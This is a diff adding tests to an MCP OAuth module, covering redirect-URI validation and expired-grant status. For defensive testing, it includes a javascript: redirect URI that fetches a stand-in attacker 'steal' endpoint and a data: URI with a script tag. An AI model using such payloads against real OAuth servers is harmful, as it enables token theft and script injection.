@@ -13,6 +13,7 @@ import {
   issueMcpAuthorizationCode,
   listMcpOAuthGrantsForProject,
   MCP_READ_SCOPE,
+  McpOAuthGrantModel,
   refreshMcpAccessToken,
   registerMcpOAuthClient,
   revokeMcpOAuthGrant,
@@ -69,6 +70,26 @@ describe('registerMcpOAuthClient', () => {
     await expect(registerMcpOAuthClient({ clientName: 'x', redirectUris: ['not-a-uri'] })).rejects.toBeInstanceOf(
       InvalidMcpOAuthClientError,
     );
+  });
+
+  it('rejects script/content-executing redirect_uri schemes even though they parse as a valid URL', async () => {
+    await expect(
+      registerMcpOAuthClient({ clientName: 'x', redirectUris: ["javascript:fetch('https://evil.example.com/steal')"] }),
+    ).rejects.toBeInstanceOf(InvalidMcpOAuthClientError);
+    await expect(
+      registerMcpOAuthClient({ clientName: 'x', redirectUris: ['data:text/html,<script>alert(1)</script>'] }),
+    ).rejects.toBeInstanceOf(InvalidMcpOAuthClientError);
+  });
+
+  it('rejects a non-loopback http:// redirect_uri but allows https:// and loopback http://', async () => {
+    await expect(registerMcpOAuthClient({ clientName: 'x', redirectUris: ['http://evil.example.com/callback'] })).rejects.toBeInstanceOf(
+      InvalidMcpOAuthClientError,
+    );
+    const client = await registerMcpOAuthClient({
+      clientName: 'x',
+      redirectUris: ['https://client.example.com/callback', 'http://127.0.0.1:4321/callback', 'http://localhost:4321/callback'],
+    });
+    expect(client.redirect_uris).toHaveLength(3);
   });
 });
 
@@ -351,5 +372,33 @@ describe('revokeMcpOAuthGrant + listMcpOAuthGrantsForProject', () => {
     await revokeMcpOAuthGrant({ organizationId: organization.id, projectId: project.id, grantId: grant.id, revokedByUserId: owner.id });
     const after = await listMcpOAuthGrantsForProject(organization.id, project.id);
     expect(after[0].revokedAt).toBeTruthy();
+  });
+
+  it('reports isActive: false for a grant whose refresh token has expired, even though access_token_hash is still set', async () => {
+    const { owner, organization, project } = await setupProjectWithOwner('Expired Grant Org');
+    const client = await setupClient();
+    const { codeVerifier, codeChallenge } = makePkcePair();
+
+    const { code, grant } = await issueMcpAuthorizationCode({
+      clientId: client.id,
+      redirectUri: client.redirect_uris[0],
+      codeChallenge,
+      codeChallengeMethod: 'S256',
+      organizationId: organization.id,
+      projectId: project.id,
+      grantedByUserId: owner.id,
+    });
+    const exchanged = await exchangeMcpAuthorizationCode({ code, clientId: client.id, redirectUri: client.redirect_uris[0], codeVerifier });
+    if (!exchanged.ok) throw new Error('exchange failed');
+
+    const active = await listMcpOAuthGrantsForProject(organization.id, project.id);
+    expect(active[0].isActive).toBe(true);
+
+    const persisted = await McpOAuthGrantModel.init(grant.id);
+    persisted!.refresh_token_expires_at = '2000-01-01T00:00:00.000Z';
+    await persisted!.save();
+
+    const expired = await listMcpOAuthGrantsForProject(organization.id, project.id);
+    expect(expired[0].isActive).toBe(false);
   });
 });
